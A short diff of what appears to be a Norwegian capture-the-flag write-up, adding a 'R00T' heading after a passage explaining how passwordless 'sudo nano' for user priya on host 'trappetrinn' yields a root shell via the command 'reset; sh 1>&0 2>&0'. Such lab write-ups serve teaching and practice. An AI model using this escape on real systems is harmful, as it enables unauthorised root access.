@@ -186,6 +186,7 @@ User priya may run the following commands on trappetrinn:
 Her var jeg svært heldig – vi kan kjøre sudo nano uten passord! A got root!!! 
 Åpne nano, trykk **Ctrl + R**, trykk deretter **Ctrl + X**, skriv inn "reset; sh 1>&0 2>&0" og ...... BOOM – vi har et shell som root! 
 
+## R00T
 ```
 ls
 priya.txt
